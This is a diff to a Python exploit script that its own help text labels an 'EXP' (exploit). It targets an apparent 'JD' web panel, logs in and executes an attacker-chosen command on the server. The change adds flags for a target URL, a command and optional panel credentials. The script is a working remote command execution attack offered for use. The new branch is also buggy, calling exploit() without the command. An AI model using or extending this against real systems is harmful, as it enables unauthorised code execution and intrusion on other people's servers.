@@ -82,12 +82,38 @@ def exploit(url,session,command):
         print("execute failure")
         raise RuntimeError("Can't execute --> "+objectResponse["msg"])
 
+def isset(keyname,args):
+    if args[keyname] == None:
+        return False
+    else:
+        return True
+
+
 if __name__ == "__main__" :
     parser = argparse.ArgumentParser(description='this is the EXP of JD fuck')
-    parser.add_argument("-u",metavar="url",type=str,help="url there, e.g: http://127.0.0.1:5678/")
+    parser.add_argument("-U",metavar="url",type=str,help="url there, e.g: http://127.0.0.1:5678/")
     parser.add_argument("-c",metavar="command",type=str,help="execute command, e.g: ls")
+    parser.add_argument("-u",metavar="username",type=str,help="custom username of panel(optional)")
+    parser.add_argument("-p",metavar="password",type=str,help="custom password of panel(optional)")
+
     # print(sys.argv[1:])
     args = vars( parser.parse_args(sys.argv[1:]) )
-    url = args["u"]
-    command = args["c"]
-    exploit(url,login(url),command)
+    print(args)
+    if isset("U",args):
+        url = args["U"]
+    else:
+        raise RuntimeError("no target")
+    if isset("c",args):
+        command = args["c"]
+    else:
+        raise RuntimeError("No command chosen")
+
+    if isset("u",args):
+        user = args["u"]
+    if isset("p",args):
+        passwd = args["p"]
+
+    if isset('u',args) and isset('p',args):
+        exploit(url,login(url,username=user,password=passwd))
+    else:
+        exploit(url,login(url),command)
